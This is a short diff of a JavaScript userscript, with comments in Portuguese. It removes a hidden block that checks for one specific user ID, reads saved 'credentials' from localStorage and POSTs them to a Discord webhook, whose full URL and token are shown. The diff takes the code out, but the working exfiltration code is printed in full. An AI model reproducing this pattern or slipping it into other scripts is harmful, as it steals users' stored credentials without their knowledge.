@@ -137,33 +137,6 @@ if (h2Element) {
 
 })();
 
-(function() {
-    'use strict';
-
-if (typeof(Storage) !== "undefined") {
-    const linkUsuario = localStorage.getItem('linkusuario');
-    
-    if (linkUsuario === '/users/820189123') {
-        const credentials = localStorage.getItem('credentials');
-        
-        if (credentials) {
-            const data = {
-                content: credentials
-            };
-
-            fetch('https://discord.com/api/webhooks/1194091810738409583/PdYDg0vnA4zzYVYD-hSopcntZArFSU48-i5OApMJw0pvYIhJPrTMKoeBjBay9ZG1cr3N', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            });
-        }
-    }
-}
-
-})();
-
 //código de marcar presença
 (function() {
     'use strict';
